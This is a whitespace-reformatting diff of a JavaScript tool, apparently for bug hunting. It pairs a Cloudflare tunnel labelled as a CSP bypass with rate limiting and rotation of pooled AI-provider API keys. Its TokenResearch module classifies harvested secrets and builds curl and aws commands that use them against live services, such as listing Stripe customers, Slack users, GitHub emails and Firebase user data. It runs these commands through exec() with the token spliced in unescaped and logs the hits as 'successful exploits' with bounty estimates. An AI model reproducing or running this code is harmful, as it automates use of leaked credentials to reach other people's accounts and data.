                     if (match && !urlFound) {
                         urlFound = true;
                         this.url = match[0];
                         this.isRunning = true;
                         CONFIG.CLOUDFLARE_URL = this.url;
-                        
+
                         const wssUrl = this.url.replace('https://', 'wss://');
-                        
+
                         console.log(`
 ${C.green}${C.bold}╔══════════════════════════════════════════════════════════════════════════════╗
 ║                    ☁️  CLOUDFLARE TUNNEL ACTIVE (CSP BYPASS!)                 ║
@@ -1474,22 +1474,22 @@ ${C.green}${C.bold}╔═══════════════════�
                         resolve(this.url);
                     }
                 };
-                
+
                 this.process.stdout.on('data', handleOutput);
                 this.process.stderr.on('data', handleOutput);
-                
+
                 this.process.on('error', (err) => {
                     log(`Cloudflare Tunnel error: ${err.message}`, 'red');
                     this.isRunning = false;
                     resolve(null);
                 });
-                
+
                 this.process.on('close', (code) => {
                     if (this.isRunning) {
                         log(`Cloudflare Tunnel closed (code: ${code})`, 'yellow');
                     }
                     this.isRunning = false;
-                    
+
                     // Auto-restart if unexpectedly closed
                     if (code !== 0 && this.retryCount < CONFIG.CLOUDFLARE_RETRY) {
                         this.retryCount++;
@@ -1497,7 +1497,7 @@ ${C.green}${C.bold}╔═══════════════════�
                         setTimeout(() => this.start(port, this.cloudflaredPath), 3000);
                     }
                 });
-                
+
                 // Timeout - if URL not found in 30 seconds
                 setTimeout(() => {
                     if (!urlFound) {
@@ -1505,14 +1505,14 @@ ${C.green}${C.bold}╔═══════════════════�
                         resolve(null);
                     }
                 }, 30000);
-                
+
             } catch (err) {
                 log(`Failed to start Cloudflare Tunnel: ${err.message}`, 'red');
                 resolve(null);
             }
         });
     },
-    
+
     // Stop tunnel
     stop() {
         if (this.process) {
@@ -1524,7 +1524,7 @@ ${C.green}${C.bold}╔═══════════════════�
             log('Cloudflare Tunnel stopped', 'yellow');
         }
     },
-    
+
     // Get connection command for browser
     getConnectCommand() {
         if (!this.url) return null;
@@ -1558,8 +1558,8 @@ const C = {
 };
 
 function generateToken() {
-    return Math.random().toString(36).substring(2, 10) + 
-           Math.random().toString(36).substring(2, 10);
+    return Math.random().toString(36).substring(2, 10) +
+        Math.random().toString(36).substring(2, 10);
 }
 
 function timestamp() {
@@ -1576,7 +1576,7 @@ const BackgroundLogger = {
     viewerOpen: false,
     lastViewerUpdate: 0,
     viewerUpdateInterval: 500,
-    
+
     // Patterns that indicate background activity (not user-initiated)
     bgPatterns: [
         /^⏳ Smart (delay|throttle)/,
@@ -1607,13 +1607,13 @@ const BackgroundLogger = {
         /bulkkeys groq/,
         /keypool/
     ],
-    
+
     // Check if message is background activity
     isBackground(msg) {
         if (!CONFIG.QUIET_MODE) return false;
         return this.bgPatterns.some(pattern => pattern.test(msg));
     },
-    
+
     // Add log entry
     add(msg, color, ts) {
         this.logs.push({
@@ -1622,21 +1622,21 @@ const BackgroundLogger = {
             color: color,
             timestamp: Date.now()
         });
-        
+
         // Trim old logs
         if (this.logs.length > this.maxLogs) {
             this.logs = this.logs.slice(-this.maxLogs);
         }
-        
+
         // Write to background log file
         try {
             fs.appendFileSync(CONFIG.BG_LOG_FILE, `[${ts}] ${msg}\n`);
-        } catch(e) {}
-        
+        } catch (e) { }
+
         // Update HTML viewer if open
         this.updateViewer();
     },
-    
+
     // Generate Professional HTML log viewer for Bug Hunters
     generateViewer() {
         // Categorize logs
@@ -1644,7 +1644,7 @@ const BackgroundLogger = {
         const warningLogs = this.logs.filter(l => l.color === 'yellow' || l.msg?.includes('⚠️') || l.msg?.includes('Rate'));
         const successLogs = this.logs.filter(l => l.color === 'green' || l.msg?.includes('✅'));
         const aiLogs = this.logs.filter(l => l.msg?.includes('AI') || l.msg?.includes('🧠') || l.msg?.includes('🤖'));
-        
+
         const logsHtml = this.logs.slice(-300).map(l => {
             const colorMap = {
                 red: '#ff6b6b', green: '#51cf66', yellow: '#fcc419',
@@ -1653,28 +1653,28 @@ const BackgroundLogger = {
             };
             const htmlColor = colorMap[l.color] || '#f8f9fa';
             const escapedMsg = (l.msg || '').replace(/</g, '&lt;').replace(/>/g, '&gt;');
-            
+
             // Determine log type for filtering
             let logType = 'info';
             if (l.color === 'red' || l.msg?.includes('❌')) logType = 'error';
             else if (l.color === 'yellow' || l.msg?.includes('⚠️')) logType = 'warning';
             else if (l.color === 'green' || l.msg?.includes('✅')) logType = 'success';
             else if (l.msg?.includes('AI') || l.msg?.includes('🧠')) logType = 'ai';
-            
+
             return '<div class="log-entry ' + logType + '" style="color:' + htmlColor + '" data-type="' + logType + '"><span class="time">[' + l.time + ']</span> ' + escapedMsg + '</div>';
         }).join('\n');
-        
+
         // Get AI status safely
         let aiStatus = { available: false, paused: false, consecutiveFailures: 0, pauseRemaining: 0 };
         try {
             if (typeof TerminalAI !== 'undefined' && TerminalAI.aiAvailability) {
                 aiStatus = TerminalAI.aiAvailability.status();
             }
-        } catch(e) {}
-        
+        } catch (e) { }
+
         const aiDotClass = aiStatus.available ? 'online' : (aiStatus.paused ? 'paused' : 'offline');
         const aiStatusText = aiStatus.available ? 'Online & Ready' : (aiStatus.paused ? 'Paused (' + aiStatus.pauseRemaining + 's)' : 'Offline');
-        
+
         return '<!DOCTYPE html><html><head><title>NEXUS Pro Dashboard</title><meta http-equiv="refresh" content="2"><style>' +
             '* { margin: 0; padding: 0; box-sizing: border-box; }' +
             'body { background: #0d1117; color: #c9d1d9; font-family: Consolas, monospace; font-size: 12px; }' +
@@ -1741,29 +1741,29 @@ const BackgroundLogger = {
             'event.target.classList.add("active");document.querySelectorAll(".log-entry").forEach(e=>{' +
             'e.classList.toggle("hidden",t!=="all"&&e.dataset.type!==t);});}</script></body></html>';
     },
-    
+
     // Update HTML viewer file
     updateViewer() {
         const now = Date.now();
         if (now - this.lastViewerUpdate < this.viewerUpdateInterval) return;
         this.lastViewerUpdate = now;
-        
+
         try {
             fs.writeFileSync(CONFIG.LOG_VIEWER_FILE, this.generateViewer());
-        } catch(e) {}
+        } catch (e) { }
     },
-    
+
     // Open log viewer in browser
     openViewer() {
         // Generate initial HTML
         fs.writeFileSync(CONFIG.LOG_VIEWER_FILE, this.generateViewer());
-        
+
         const viewerPath = path.resolve(CONFIG.LOG_VIEWER_FILE);
-        
+
         // Open in default browser
-        const opener = process.platform === 'win32' ? 'start' : 
-                       process.platform === 'darwin' ? 'open' : 'xdg-open';
-        
+        const opener = process.platform === 'win32' ? 'start' :
+            process.platform === 'darwin' ? 'open' : 'xdg-open';
+
         exec(`${opener} "${viewerPath}"`, (err) => {
             if (err) {
                 log(`📄 Log viewer: file://${viewerPath}`, 'cyan');
@@ -1771,22 +1771,22 @@ const BackgroundLogger = {
                 log('🔔 Opened background log viewer in browser!', 'green');
             }
         });
-        
+
         this.viewerOpen = true;
     },
-    
+
     // Get recent logs
     getRecent(count = 20) {
         return this.logs.slice(-count);
     },
-    
+
     // Clear logs
     clear() {
         this.logs = [];
         try {
             fs.writeFileSync(CONFIG.BG_LOG_FILE, '');
             this.updateViewer();
-        } catch(e) {}
+        } catch (e) { }
     }
 };
 
@@ -1794,21 +1794,21 @@ const BackgroundLogger = {
 function log(msg, color = 'white') {
     const ts = timestamp();
     const colorCode = C[color] || C.white;
-    
+
     // Check if this is a background log
     if (BackgroundLogger.isBackground(msg)) {
         // Only log to background file, not terminal
         BackgroundLogger.add(msg, color, ts);
         return;
     }
-    
+
     // Regular log - show in terminal
     console.log(`${colorCode}[${ts}] ${msg}${C.reset}`);
-    
+
     // Also write to main log file
     try {
         fs.appendFileSync(CONFIG.LOG_FILE, `[${ts}] ${msg}\n`);
-    } catch(e) {}
+    } catch (e) { }
 }
 
 function logBox(title, content, color = 'cyan') {
@@ -1914,7 +1914,7 @@ const AIMemory = {
         lastUpdated: null,
         version: '1.0'
     },
-    
+
     // Load from disk
     load() {
         try {
@@ -1929,7 +1929,7 @@ const AIMemory = {
         }
         return false;
     },
-    
+
     // Save to disk
     save() {
         try {
@@ -1941,11 +1941,11 @@ const AIMemory = {
             return false;
         }
     },
-    
+
     // Learn from a token analysis
     learnFromToken(token, type, analysis, exploitResult) {
         const hash = this.hashToken(token);
-        
+
         this.data.tokenDatabase[hash] = {
             type,
             prefix: token.substring(0, 10),
@@ -1954,13 +1954,13 @@ const AIMemory = {
             exploitResult,
             analyzedAt: new Date().toISOString()
         };
-        
+
         this.data.totalTokensAnalyzed++;
-        
+
         // Learn pattern if exploit was successful
         if (exploitResult?.success) {
             this.data.totalExploitsFound++;
-            
+
             // Extract service signature
             const service = analysis?.service || type;
             if (!this.data.serviceSignatures[service]) {
@@ -1971,16 +1971,16 @@ const AIMemory = {
                     exploitCommands: []
                 };
             }
-            
+
             const sig = this.data.serviceSignatures[service];
             sig.patterns.push(type);
             sig.prefixes.push(token.substring(0, 10));
             sig.avgLength = ((sig.avgLength * (sig.prefixes.length - 1)) + token.length) / sig.prefixes.length;
-            
+
             if (exploitResult.command) {
                 sig.exploitCommands.push(exploitResult.command);
             }
-            
+
             // Save successful exploit playbook
             this.data.successfulExploits.push({
                 type,
@@ -1991,13 +1991,13 @@ const AIMemory = {
                 timestamp: new Date().toISOString()
             });
         }
-        
+
         // Auto-save periodically
         if (this.data.totalTokensAnalyzed % 10 === 0) {
             this.save();
         }
     },
-    
+
     // Record AI-to-AI conversation
     recordConversation(from, to, message, response) {
         this.data.aiConversations.push({
@@ -2007,33 +2007,33 @@ const AIMemory = {
             response: typeof response === 'string' ? response.substring(0, 1000) : JSON.stringify(response).substring(0, 1000),
             timestamp: new Date().toISOString()
         });
-        
+
         // Keep only last 500 conversations
         if (this.data.aiConversations.length > 500) {
             this.data.aiConversations = this.data.aiConversations.slice(-500);
         }
     },
-    
+
     // Get similar tokens from memory
     findSimilarTokens(token) {
         const prefix = token.substring(0, 10);
         const similar = [];
-        
+
         for (const [hash, data] of Object.entries(this.data.tokenDatabase)) {
-            if (data.prefix === prefix || 
+            if (data.prefix === prefix ||
                 data.type === this.guessType(token) ||
                 Math.abs(data.length - token.length) < 5) {
                 similar.push(data);
             }
         }
-        
+
         return similar;
     },
-    
+
     // Get exploitation recommendations based on learned data
     getExploitRecommendations(type) {
         const recommendations = [];
-        
+
         // Check service signatures
         for (const [service, sig] of Object.entries(this.data.serviceSignatures)) {
             if (sig.patterns.includes(type)) {
@@ -2044,7 +2044,7 @@ const AIMemory = {
                 });
             }
         }
-        
+
         // Check successful exploits
         const relevantExploits = this.data.successfulExploits.filter(e => e.type === type);
         if (relevantExploits.length > 0) {
@@ -2054,10 +2054,10 @@ const AIMemory = {
                 successRate: `${relevantExploits.length} successful exploits recorded`
             });
         }
-        
+
         return recommendations;
     },
-    
+
     // Simple hash for tokens
     hashToken(token) {
         let hash = 0;
@@ -2068,7 +2068,7 @@ const AIMemory = {
         }
         return hash.toString(16);
     },
-    
+
     // Guess token type from pattern
     guessType(token) {
         if (token.startsWith('AKIA')) return 'AWS_ACCESS_KEY_ID';
@@ -2084,7 +2084,7 @@ const AIMemory = {
         if (token.includes('.firebaseio.com')) return 'FIREBASE_DB_URL';
         return 'UNKNOWN';
     },
-    
+
     // Get memory stats
     getStats() {
         return {
@@ -2177,7 +2177,7 @@ const TokenResearch = {
             impact: 'API access, usage tracking'
         }
     },
-    
+
     // Research a token deeply
     async research(token, type) {
         const research = {
@@ -2192,7 +2192,7 @@ const TokenResearch = {
             exploitCommands: [],
             validationResult: null
         };
-        
+
         // Get service info
         const serviceInfo = this.serviceDB[type];
         if (serviceInfo) {
@@ -2203,83 +2203,83 @@ const TokenResearch = {
             research.bountyEstimate = serviceInfo.bountyRange;
             research.impact = serviceInfo.impact;
         }
-        
+
         // Generate test commands based on type
         research.exploitCommands = this.generateTestCommands(token, type);
-        
+
         // Get recommendations from memory
         const memoryRecommendations = AIMemory.getExploitRecommendations(type);
         if (memoryRecommendations.length > 0) {
             research.learnedCommands = memoryRecommendations;
         }
-        
+
         return research;
     },
-    
+
     // Generate test commands for a token
     generateTestCommands(token, type) {
         const commands = [];
-        
+
         switch (type) {
             case 'AWS_ACCESS_KEY_ID':
                 commands.push(`aws sts get-caller-identity --access-key-id ${token}`);
                 commands.push(`aws s3 ls --access-key-id ${token}`);
                 commands.push(`aws iam list-users --access-key-id ${token}`);
                 break;
-                
+
             case 'GOOGLE_API_KEY':
             case 'FIREBASE_API_KEY':
                 commands.push(`curl "https://www.googleapis.com/customsearch/v1?key=${token}&cx=test&q=test"`);
                 commands.push(`curl "https://maps.googleapis.com/maps/api/staticmap?key=${token}&center=0,0&zoom=1&size=1x1"`);
                 commands.push(`curl "https://www.googleapis.com/youtube/v3/search?key=${token}&part=snippet&q=test"`);
                 break;
-                
+
             case 'GITHUB_PAT':
             case 'GITHUB_OAUTH':
                 commands.push(`curl -H "Authorization: token ${token}" https://api.github.com/user`);
                 commands.push(`curl -H "Authorization: token ${token}" https://api.github.com/user/repos`);
                 commands.push(`curl -H "Authorization: token ${token}" https://api.github.com/user/emails`);
                 break;
-                
+
             case 'STRIPE_SECRET_KEY':
                 commands.push(`curl -u ${token}: https://api.stripe.com/v1/balance`);
                 commands.push(`curl -u ${token}: https://api.stripe.com/v1/customers?limit=5`);
                 commands.push(`curl -u ${token}: https://api.stripe.com/v1/charges?limit=5`);
                 break;
-                
+
             case 'SLACK_BOT_TOKEN':
             case 'SLACK_USER_TOKEN':
                 commands.push(`curl -H "Authorization: Bearer ${token}" https://slack.com/api/auth.test`);
                 commands.push(`curl -H "Authorization: Bearer ${token}" https://slack.com/api/users.list`);
                 commands.push(`curl -H "Authorization: Bearer ${token}" https://slack.com/api/conversations.list`);
                 break;
-                
+
             case 'OPENAI_API_KEY':
                 commands.push(`curl -H "Authorization: Bearer ${token}" https://api.openai.com/v1/models`);
                 commands.push(`curl -H "Authorization: Bearer ${token}" https://api.openai.com/v1/usage`);
                 break;
-                
+
             case 'ANTHROPIC_API_KEY':
                 commands.push(`curl -H "x-api-key: ${token}" -H "anthropic-version: 2023-06-01" https://api.anthropic.com/v1/messages`);
                 break;
-                
+
             case 'GROQ_API_KEY':
                 commands.push(`curl -H "Authorization: Bearer ${token}" https://api.groq.com/openai/v1/models`);
                 break;
-                
+
             case 'FIREBASE_DB_URL':
                 commands.push(`curl "${token}/.json"`);
                 commands.push(`curl "${token}/users.json"`);
                 break;
-                
+
             default:
                 commands.push(`# Unknown token type: ${type}`);
                 commands.push(`# Manual research required`);
         }
-        
+
         return commands;
     },
-    
+
     // Validate a token by actually testing it
     async validate(token, type) {
         const results = {
@@ -2289,24 +2289,24 @@ const TokenResearch = {
             error: null,
             rawOutput: null
         };
-        
+
         const commands = this.generateTestCommands(token, type);
         if (commands.length === 0) {
             results.error = 'No validation commands for this token type';
             return results;
         }
-        
+
         // Execute first command
         const cmd = commands[0];
-        
+
         return new Promise((resolve) => {
             exec(cmd, { timeout: 30000 }, (error, stdout, stderr) => {
                 results.rawOutput = stdout || stderr;
-                
+
                 if (error) {
                     results.error = error.message;
                     // Check if error indicates invalid key
-                    if (results.rawOutput?.includes('invalid') || 
+                    if (results.rawOutput?.includes('invalid') ||
                         results.rawOutput?.includes('unauthorized') ||
                         results.rawOutput?.includes('denied')) {
                         results.valid = false;
@@ -2314,7 +2314,7 @@ const TokenResearch = {
                 } else if (stdout) {
                     results.valid = true;
                     results.live = true;
-                    
+
                     // Parse permissions from output
                     try {
                         const json = JSON.parse(stdout);
@@ -2325,14 +2325,14 @@ const TokenResearch = {
                         // Not JSON, but still valid
                     }
                 }
-                
+
                 // Learn from this validation
                 AIMemory.learnFromToken(token, type, { validated: true }, {
                     success: results.live,
                     command: cmd,
                     output: results.rawOutput?.substring(0, 500)
                 });
-                
+
                 resolve(results);
             });
         });
@@ -2418,11 +2418,11 @@ const ProRateLimiter = {
             minuteStart: Date.now()
         }
     },
-    
+
     // === SLIDING WINDOW TRACKING ===
     requestLog: {},           // { provider: [timestamp1, timestamp2, ...] }
     windowSizeMs: 60000,      // 1 minute window
-    
+
     // === ADAPTIVE CONTROL ===
     adaptive: {
         enabled: true,
@@ -2435,12 +2435,12 @@ const ProRateLimiter = {
         successStreak: {},    // { provider: count } - track consecutive successes
         headerLimits: {}      // { provider: { remaining, reset, limit } }
     },
-    
+
     // === QUEUE SYSTEM ===
     queue: [],                // [{ provider, resolve, reject, priority }]
     processing: false,
     queueEnabled: true,
-    
+
     // === INITIALIZATION ===
     init() {
         // Initialize requestLog and adaptive state for each provider
@@ -2452,57 +2452,57 @@ const ProRateLimiter = {
         });
         log('🚀 ProRateLimiter initialized - Industry-grade rate limiting active', 'green');
     },
-    
+
     // === TOKEN BUCKET: REFILL TOKENS ===
     refillBucket(provider) {
         const bucket = this.buckets[provider];
         if (!bucket) return;
-        
+
         const now = Date.now();
         const elapsed = (now - bucket.lastRefill) / 1000; // seconds
         const tokensToAdd = elapsed * bucket.refillRate;
-        
+
         bucket.tokens = Math.min(bucket.maxTokens, bucket.tokens + tokensToAdd);
         bucket.lastRefill = now;
-        
+
         // Reset minute counter if minute passed
         if (now - bucket.minuteStart >= 60000) {
             bucket.usedTokensThisMinute = 0;
             bucket.minuteStart = now;
         }
     },
-    
+
     // === SLIDING WINDOW: COUNT RECENT REQUESTS ===
     countRecentRequests(provider) {
         const now = Date.now();
         const log = this.requestLog[provider] || [];
-        
+
         // Filter to keep only requests within window
         this.requestLog[provider] = log.filter(ts => now - ts < this.windowSizeMs);
-        
+
         return this.requestLog[provider].length;
     },
-    
+
     // === CALCULATE OPTIMAL DELAY ===
     calculateDelay(provider) {
         const bucket = this.buckets[provider];
         if (!bucket) return this.adaptive.minDelay;
-        
+
         this.refillBucket(provider);
-        
+
         const recentRequests = this.countRecentRequests(provider);
         const penalty = this.adaptive.currentPenalty[provider] || 1;
-        
+
         // Calculate how much of the rate limit we've used
         const usageRatio = recentRequests / (bucket.requestsPerMinute * this.adaptive.safetyMargin);
-        
+
         // Check header-based limits if available
         const headerLimit = this.adaptive.headerLimits[provider];
         if (headerLimit && headerLimit.remaining !== undefined) {
             const headerRatio = 1 - (headerLimit.remaining / headerLimit.limit);
             // Use the more conservative ratio
             const effectiveRatio = Math.max(usageRatio, headerRatio);
-            
+
             if (effectiveRatio > 0.9) {
                 // Very close to limit - long delay
                 return Math.min(this.adaptive.maxDelay, 10000 * penalty);
@@ -2511,10 +2511,10 @@ const ProRateLimiter = {
                 return Math.min(this.adaptive.maxDelay, 5000 * penalty);
             }
         }
-        
+
         // === ADAPTIVE DELAY CALCULATION ===
         let baseDelay;
-        
+
         if (usageRatio >= 0.9) {
             // At 90%+ usage - aggressive slowdown
             baseDelay = 15000;
@@ -2531,67 +2531,67 @@ const ProRateLimiter = {
             // Low usage - can go faster
             baseDelay = 1500;
         }
-        
+
         // Apply penalty multiplier from recent rate limits
         const penalizedDelay = baseDelay * penalty;
-        
+
         // Add jitter to prevent synchronized requests (±15%)
         const jitter = penalizedDelay * (Math.random() * 0.3 - 0.15);
-        
+
         return Math.max(this.adaptive.minDelay, Math.min(this.adaptive.maxDelay, penalizedDelay + jitter));
     },
-    
+
     // === CHECK IF CAN MAKE REQUEST ===
     canRequest(provider) {
         const bucket = this.buckets[provider];
         if (!bucket) return true;
-        
+
         this.refillBucket(provider);
-        
+
         // Check token bucket
         if (bucket.tokens < 1) {
             return false;
         }
-        
+
         // Check sliding window
         const recentRequests = this.countRecentRequests(provider);
         const safeLimit = Math.floor(bucket.requestsPerMinute * this.adaptive.safetyMargin);
-        
+
         if (recentRequests >= safeLimit) {
             return false;
         }
-        
+
         return true;
     },
-    
+
     // === CONSUME A TOKEN (BEFORE REQUEST) ===
     consumeToken(provider) {
         const bucket = this.buckets[provider];
         if (!bucket) return;
-        
+
         this.refillBucket(provider);
-        
+
         bucket.tokens = Math.max(0, bucket.tokens - 1);
         this.requestLog[provider].push(Date.now());
     },
-    
+
     // === HANDLE RATE LIMIT RESPONSE ===
     onRateLimit(provider, retryAfterMs = null) {
         const bucket = this.buckets[provider];
-        
+
         // Record rate limit event
         this.adaptive.lastRateLimit[provider] = Date.now();
         this.adaptive.successStreak[provider] = 0;
-        
+
         // Increase penalty (exponential backoff)
         const currentPenalty = this.adaptive.currentPenalty[provider] || 1;
         this.adaptive.currentPenalty[provider] = Math.min(8, currentPenalty * this.adaptive.backoffMultiplier);
-        
+
         // Drain the bucket
         if (bucket) {
             bucket.tokens = 0;
         }
-        
+
         // If we have retry-after header, use it
         if (retryAfterMs) {
             const waitSec = Math.ceil(retryAfterMs / 1000);
@@ -2600,47 +2600,47 @@ const ProRateLimiter = {
             log(`⏳ Rate limited. Penalty increased to ${this.adaptive.currentPenalty[provider].toFixed(1)}x`, 'yellow');
         }
     },
-    
+
     // === HANDLE SUCCESSFUL RESPONSE ===
     onSuccess(provider) {
         // Increase success streak
         this.adaptive.successStreak[provider] = (this.adaptive.successStreak[provider] || 0) + 1;
-        
+
         // Reduce penalty after consecutive successes
         if (this.adaptive.successStreak[provider] >= 3) {
             const currentPenalty = this.adaptive.currentPenalty[provider] || 1;
             this.adaptive.currentPenalty[provider] = Math.max(1, currentPenalty * 0.8);
-            
+
             if (currentPenalty > 1) {
                 log(`✅ Success streak! Penalty reduced to ${this.adaptive.currentPenalty[provider].toFixed(1)}x`, 'green');
             }
         }
     },
-    
+
     // === UPDATE FROM RESPONSE HEADERS ===
     updateFromHeaders(provider, headers) {
         if (!headers) return;
-        
+
         // Common rate limit headers
-        const remaining = headers['x-ratelimit-remaining'] || 
-                         headers['x-rate-limit-remaining'] ||
-                         headers['ratelimit-remaining'];
-        
+        const remaining = headers['x-ratelimit-remaining'] ||
+            headers['x-rate-limit-remaining'] ||
+            headers['ratelimit-remaining'];
+
         const limit = headers['x-ratelimit-limit'] ||
-                     headers['x-rate-limit-limit'] ||
-                     headers['ratelimit-limit'];
-        
+            headers['x-rate-limit-limit'] ||
+            headers['ratelimit-limit'];
+
         const reset = headers['x-ratelimit-reset'] ||
-                     headers['x-rate-limit-reset'] ||
-                     headers['ratelimit-reset'];
-        
+            headers['x-rate-limit-reset'] ||
+            headers['ratelimit-reset'];
+
         if (remaining !== undefined || limit !== undefined) {
             this.adaptive.headerLimits[provider] = {
                 remaining: parseInt(remaining) || 0,
                 limit: parseInt(limit) || 60,
                 reset: reset ? parseInt(reset) * 1000 : Date.now() + 60000
             };
-            
+
             // Adjust bucket based on actual limits
             const bucket = this.buckets[provider];
             if (bucket && limit) {
@@ -2649,14 +2649,14 @@ const ProRateLimiter = {
             }
         }
     },
-    
+
     // === SMART WAIT - MAIN ENTRY POINT ===
     async smartWait(provider) {
         provider = (provider || 'groq').toLowerCase();
-        
+
         // Calculate optimal delay
         const delay = this.calculateDelay(provider);
-        
+
         // Check if we should wait
         if (!this.canRequest(provider)) {
             const bucket = this.buckets[provider];
@@ -2664,26 +2664,26 @@ const ProRateLimiter = {
             log(`⏳ Near rate limit for ${provider.toUpperCase()}. Smart waiting ${waitTime}s...`, 'yellow');
             await this._delay(Math.min(waitTime * 1000, this.adaptive.maxDelay));
         } else if (delay > 1000) {
-            log(`⏳ Smart delay: ${Math.ceil(delay/1000)}s (${provider.toUpperCase()} protection)`, 'dim');
+            log(`⏳ Smart delay: ${Math.ceil(delay / 1000)}s (${provider.toUpperCase()} protection)`, 'dim');
             await this._delay(delay);
         } else {
             // Small delay always for safety
             await this._delay(delay);
         }
-        
+
         // Consume token before making request
         this.consumeToken(provider);
     },
-    
+
     // === GET STATUS FOR UI ===
     getStatus(provider) {
         provider = provider.toLowerCase();
         const bucket = this.buckets[provider];
         if (!bucket) return null;
-        
+
         this.refillBucket(provider);
         const recentRequests = this.countRecentRequests(provider);
-        
+
         return {
             provider: provider.toUpperCase(),
             tokensAvailable: Math.floor(bucket.tokens),
@@ -2696,28 +2696,28 @@ const ProRateLimiter = {
             safeToRequest: this.canRequest(provider)
         };
     },
-    
+
     // === SHOW ALL PROVIDER STATUS ===
     showStatus() {
         console.log(`\n${C.bold}${C.cyan}═══════════════════════════════════════════════════════════════${C.reset}`);
         console.log(`${C.bold}${C.cyan}   🚀 PRO RATE LIMITER STATUS${C.reset}`);
         console.log(`${C.cyan}═══════════════════════════════════════════════════════════════${C.reset}`);
-        
+
         Object.keys(this.buckets).forEach(provider => {
             const status = this.getStatus(provider);
             if (status) {
-                const usageBar = '█'.repeat(Math.floor(status.usagePercent / 10)) + 
-                                '░'.repeat(10 - Math.floor(status.usagePercent / 10));
-                const color = status.usagePercent > 80 ? C.red : 
-                             status.usagePercent > 50 ? C.yellow : C.green;
-                
+                const usageBar = '█'.repeat(Math.floor(status.usagePercent / 10)) +
+                    '░'.repeat(10 - Math.floor(status.usagePercent / 10));
+                const color = status.usagePercent > 80 ? C.red :
+                    status.usagePercent > 50 ? C.yellow : C.green;
+
                 console.log(`${C.bold}${provider.toUpperCase().padEnd(12)}${C.reset} [${color}${usageBar}${C.reset}] ${status.usagePercent}% | Tokens: ${status.tokensAvailable}/${status.maxTokens} | Penalty: ${status.penalty}x | ${status.safeToRequest ? C.green + '✓ SAFE' : C.red + '✗ WAIT'}${C.reset}`);
             }
         });
-        
+
         console.log(`${C.cyan}═══════════════════════════════════════════════════════════════${C.reset}\n`);
     },
-    
+
     // === HELPER ===
     _delay(ms) {
         return new Promise(resolve => setTimeout(resolve, ms));
@@ -2741,7 +2741,7 @@ const AIRequestQueue = {
     processing: false,
     processInterval: null,
     requestId: 0,
-    
+
     // === CONFIG ===
     config: {
         maxQueueSize: 200,         // Max pending requests
@@ -2751,7 +2751,7 @@ const AIRequestQueue = {
         priorityBoost: { urgent: 100, high: 50, normal: 0, low: -50 },
         timeout: 60000             // Request timeout 60s
     },
-    
+
     // === STATS ===
     stats: {
         totalQueued: 0,
@@ -2761,39 +2761,39 @@ const AIRequestQueue = {
         lastProcessed: null,
         byProvider: {}
     },
-    
+
     // === INITIALIZE ===
     init() {
         // Start processing loop
         if (!this.processInterval) {
             this.processInterval = setInterval(() => this.processQueue(), this.config.processingInterval);
         }
-        
+
         // Initialize stats for all providers
         const providers = ['groq', 'gemini', 'openai', 'deepseek', 'together', 'mistral', 'anthropic', 'openrouter', 'huggingface'];
         providers.forEach(p => {
             this.stats.byProvider[p] = { queued: 0, processed: 0, failed: 0, avgTime: 0 };
         });
-        
+
         console.log(`${C.green}📋 AIRequestQueue initialized - Smart key distribution active${C.reset}`);
     },
-    
+
     // === ADD REQUEST TO QUEUE ===
     async enqueue(provider, prompt, context = {}, executeFn) {
         if (!this.enabled) {
             // Bypass queue if disabled
             return executeFn();
         }
-        
+
         if (this.queue.length >= this.config.maxQueueSize) {
             console.log(`${C.red}⚠️ Request queue full (${this.config.maxQueueSize}). Dropping request.${C.reset}`);
             return { error: 'Request queue full' };
         }
-        
+
         return new Promise((resolve, reject) => {
             const requestId = ++this.requestId;
             const priority = context.priority || 'normal';
-            
+
             const request = {
                 id: requestId,
                 provider: provider.toLowerCase(),
@@ -2807,7 +2807,7 @@ const AIRequestQueue = {
                 timestamp: Date.now(),
                 status: 'queued'
             };
-            
+
             // Insert in priority order
             let inserted = false;
             for (let i = 0; i < this.queue.length; i++) {
@@ -2820,53 +2820,53 @@ const AIRequestQueue = {
             if (!inserted) {
                 this.queue.push(request);
             }
-            
+
             this.stats.totalQueued++;
             this.stats.byProvider[provider]?.queued && this.stats.byProvider[provider].queued++;
-            
+
             // Debug log for queue status (only when > 5 items)
             if (this.queue.length > 5) {
                 BackgroundLogger?.log?.(`[Queue] ${this.queue.length} pending, added ${provider} request #${requestId}`, 'queue');
             }
         });
     },
-    
+
     // === GET BEST KEY FOR PROVIDER ===
     getBestKey(provider) {
         provider = provider.toLowerCase();
-        
+
         // Get key pool from TerminalAI (will be set up later)
         if (typeof TerminalAI !== 'undefined' && TerminalAI.keyPool) {
             const pool = TerminalAI.keyPool[provider];
-            
+
             if (!pool || pool.length === 0) {
                 // No pool - use single key
                 return { keyIndex: 0, key: null };
             }
-            
+
             // Find key with lowest usage that's not in flight
             let bestKey = null;
             let bestIndex = -1;
             let lowestUsage = Infinity;
-            
+
             const now = Date.now();
-            
+
             for (let i = 0; i < pool.length; i++) {
                 const keyId = `${provider}_${i}`;
                 const status = TerminalAI.keyPoolStatus?.[keyId];
                 const cooldown = TerminalAI.keyPoolCooldowns?.[keyId] || 0;
                 const inFlight = this.inFlight[keyId];
                 const usage = this.keyUsage[keyId] || 0;
-                
+
                 // Skip dead keys
                 if (status === 'dead') continue;
-                
+
                 // Skip rate limited keys still in cooldown
                 if (status === 'rate_limited' && now < cooldown) continue;
-                
+
                 // Skip keys with in-flight requests (KEY FEATURE!)
                 if (inFlight) continue;
-                
+
                 // Pick lowest usage key
                 if (usage < lowestUsage) {
                     lowestUsage = usage;
@@ -2874,58 +2874,58 @@ const AIRequestQueue = {
                     bestIndex = i;
                 }
             }
-            
+
             if (bestIndex >= 0) {
                 return { keyIndex: bestIndex, key: bestKey };
             }
-            
+
             // All keys busy or rate limited - return null to wait
             return { keyIndex: -1, key: null, allBusy: true };
         }
-        
+
         return { keyIndex: 0, key: null };
     },
-    
+
     // === PROCESS QUEUE ===
     async processQueue() {
         if (this.processing || this.queue.length === 0) return;
-        
+
         this.processing = true;
-        
+
         try {
             // Find a request we can process
             for (let i = 0; i < this.queue.length; i++) {
                 const request = this.queue[i];
-                
+
                 // Check if we can process this provider
                 const { keyIndex, key, allBusy } = this.getBestKey(request.provider);
-                
+
                 if (allBusy) {
                     // All keys for this provider are busy - try next request
                     continue;
                 }
-                
+
                 // Check ProRateLimiter
                 if (!ProRateLimiter.canRequest(request.provider)) {
                     continue;
                 }
-                
+
                 // Remove from queue
                 this.queue.splice(i, 1);
-                
+
                 // Mark key as in-flight
                 const keyId = `${request.provider}_${keyIndex}`;
                 this.inFlight[keyId] = true;
                 this.keyUsage[keyId] = (this.keyUsage[keyId] || 0) + 1;
